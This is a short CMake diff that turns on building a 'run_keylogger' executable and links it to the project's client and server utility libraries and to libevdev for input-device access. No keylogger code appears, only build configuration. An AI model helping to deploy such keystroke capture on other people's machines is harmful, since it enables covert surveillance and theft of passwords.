@@ -16,8 +16,8 @@ add_library(client client.c client.h)
 
 add_executable(main main.c)
 add_executable(run_server run_server.c)
-# add_executable(run_keylogger run_keylogger.c)
+add_executable(run_keylogger run_keylogger.c)
 
 target_link_libraries(run_server PRIVATE client server server_utils ${LIBEVDEV_LIBRARY} evdev)
-# target_link_libraries(run_keylogger PRIVATE keylogger ${LIBEVDEV_LIBRARY} evdev)
+target_link_libraries(run_keylogger PRIVATE keylogger client server_utils ${LIBEVDEV_LIBRARY} evdev)
 target_link_libraries(main PRIVATE client keylogger server server_utils ${LIBEVDEV_LIBRARY} evdev)
